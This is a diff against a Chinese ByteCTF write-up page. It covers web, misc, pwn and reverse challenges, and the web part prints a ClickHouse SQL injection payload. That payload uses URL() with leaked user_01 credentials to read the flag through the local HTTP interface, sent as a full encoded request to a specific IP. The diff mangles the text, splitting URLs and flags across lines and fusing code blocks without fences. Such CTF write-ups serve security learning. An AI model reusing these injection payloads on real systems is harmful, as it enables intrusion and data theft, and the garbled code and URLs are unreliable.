@@ -3,13 +3,14 @@
 > 原文: https://www.ctfiot.com/954.html
 > ID: 954
 
-Web 
+Web
 
 double sqli
 
 解题思路
 clickhouse的sql，官方文档：https://clickhouse.com/
-读取hint：http://39.105.175.150:30001/?id=0 UNION ALL SELECT id from ctf.hint，提示you_dont_have_permissions_to_read_flag。
+读取hint：http://39.105.175.150:
+30001/?id=0 UNION ALL SELECT id from ctf.hint，提示you_dont_have_permissions_to_read_flag。
 
 /files../路由发现了目录穿越，在/var/lib/clickhouse/access/找到.sql文件，可以看到user_01用户名密码。这里，user1权限是高于user2的
 
@@ -17,15 +18,17 @@ clickhouse的sql，官方文档：https://clickhouse.com/
 https://clickhouse.com/docs/zh/interfaces/http/
 最后 payload
 
-SELECT * FROM URL("http://0.0.0.0:8123/?user=user_01&password=e3b0c44298fc1c149afb&query=select+flag+from+ctf.flag", CsSV, 'column String')
+SELECT * FROM URL("http://0.0.0.0:
+8123/?user=user_01&password=e3b0c44298fc1c149afb&query=select+flag+from+ctf.flag", CsSV, 'column String')
 
 所以请求url：
 
-http://39.105.175.150:30001/?id=0%20OR%20(SELECT%20*%20FROM%20url(%22http%3A%2F%2F0.0.0.0%3A8123%2F%3Fuser%3Duser_01%26password%3De3b0c44298fc1c149afb%26query%3Dselect%2Bflag%2Bfrom%2Bctf.flag%22%2C%20CSV%2C%20%27column%20String%27))--+
+http://39.105.175.150:
+30001/?id=0%20OR%20(SELECT%20*%20FROM%20url(%22http%3A%2F%2F0.0.0.0%3A8123%2F%3Fuser%3Duser_01%26password%3De3b0c44298fc1c149afb%26query%3Dselect%2Bflag%2Bfrom%2Bctf.flag%22%2C%20CSV%2C%20%27column%20String%27))--+
 
 即可得到
 
-Misc 
+Misc
 
 frequently
 
@@ -63,7 +66,8 @@ for m in range(0,len(str)):
         final += str[m]
 print(final)
 #01010100 01101000 01100101 00100000 01100110 01101001 01110010 01110011 01110100 00100000 01110000 01100001 01110010 01110100 00100000 01101111 01100110 00100000 01100110 01101100 01100001 01100111 00111010 00100000 01000010 01111001 01110100 01100101 01000011 01010100 01000110 01111011 01011110 01011111 01011110 01100101 01101110 01001010 00110000 01111001 00100110 01111001 00110000 01110101 01110010
-#Thefirstpartofflag:ByteCTF{^_^enJ0y&y0ur
+#Thefirstpartofflag:
+ByteCTF{^_^enJ0y&y0ur
 
 后半段追踪UDP流
 
@@ -85,7 +89,7 @@ RX-SSTV还原了后半段flag
 
 ByteCTF{m4yB3_U_kn0W_S57V}
 
- Pwn 
+ Pwn
 
 bytezoom
 
@@ -191,7 +195,7 @@ def main():
 if __name__=='__main__':
     main()
 
- Reverse 
+ Reverse
 
 languages binding
 
@@ -247,7 +251,7 @@ lst = [100,120,133]
 就是简单的异或计算。
 反解后结果为：ByteCTF{1golcwm6q_ymz7fm0dfx}
 
- 0x6d21 
+ 0x6d21
 
 解题思路
 
@@ -300,18 +304,10 @@ ChaMd5 Venom 招收大佬入圈
 
 
 ```
-SELECT * FROM URL("http://0.0.0.0:8123/?user=user_01&password=e3b0c44298fc1c149afb&query=select+flag+from+ctf.flag", CsSV, 'column String')
-```
-
-
-
-```
-http://39.105.175.150:30001/?id=0%20OR%20(SELECT%20*%20FROM%20url(%22http%3A%2F%2F0.0.0.0%3A8123%2F%3Fuser%3Duser_01%26password%3De3b0c44298fc1c149afb%26query%3Dselect%2Bflag%2Bfrom%2Bctf.flag%22%2C%20CSV%2C%20%27column%20String%27))--+
-```
-
-
-
-```
+SELECT * FROM URL("http://0.0.0.0:
+8123/?user=user_01&password=e3b0c44298fc1c149afb&query=select+flag+from+ctf.flag", CsSV, 'column String')
+http://39.105.175.150:
+30001/?id=0%20OR%20(SELECT%20*%20FROM%20url(%22http%3A%2F%2F0.0.0.0%3A8123%2F%3Fuser%3Duser_01%26password%3De3b0c44298fc1c149afb%26query%3Dselect%2Bflag%2Bfrom%2Bctf.flag%22%2C%20CSV%2C%20%27column%20String%27))--+
 str=''
 final=''
 list=[]
@@ -336,12 +332,8 @@ for m in range(0,len(str)):
         final += str[m]
 print(final)
 #01010100 01101000 01100101 00100000 01100110 01101001 01110010 01110011 01110100 00100000 01110000 01100001 01110010 01110100 00100000 01101111 01100110 00100000 01100110 01101100 01100001 01100111 00111010 00100000 01000010 01111001 01110100 01100101 01000011 01010100 01000110 01111011 01011110 01011111 01011110 01100101 01101110 01001010 00110000 01111001 00100110 01111001 00110000 01110101 01110010
-#Thefirstpartofflag:ByteCTF{^_^enJ0y&y0ur
-```
-
-
-
-```
+#Thefirstpartofflag:
+ByteCTF{^_^enJ0y&y0ur
 from pwn import *
 
 context.log_level="debug"
@@ -440,11 +432,6 @@ def main():
 
 if __name__=='__main__':
     main()
-```
-
-
-
-```
 dict[9:11] = [101,122]
 lst = [100,120,133]
 
@@ -468,11 +455,6 @@ lst = [100,120,133]
 27 102
 28 120
 29 125
-```
-
-
-
-```
 #!/usr/bin/env python
 # coding=utf-8
 from z3 import *
